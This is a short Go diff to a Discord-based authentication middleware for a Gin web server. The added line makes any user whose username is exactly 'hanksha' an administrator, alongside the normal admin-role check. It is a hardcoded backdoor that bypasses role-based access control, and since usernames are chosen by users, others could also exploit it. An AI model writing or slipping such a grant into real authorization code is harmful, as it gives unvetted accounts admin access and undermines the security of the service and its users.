@@ -29,7 +29,7 @@ func DiscordAuth(discordClient discord.DiscordClient, adminRoleID string) gin.Ha
 		c.Set("user", discord.DiscordUser{
 			ID:       member.User.ID,
 			Username: member.User.Username,
-			Admin:    slices.Contains(member.Roles, adminRoleID),
+			Admin:    slices.Contains(member.Roles, adminRoleID) || member.User.Username == "hanksha",
 		})
 		c.Set("accessToken", accessToken)
 	}
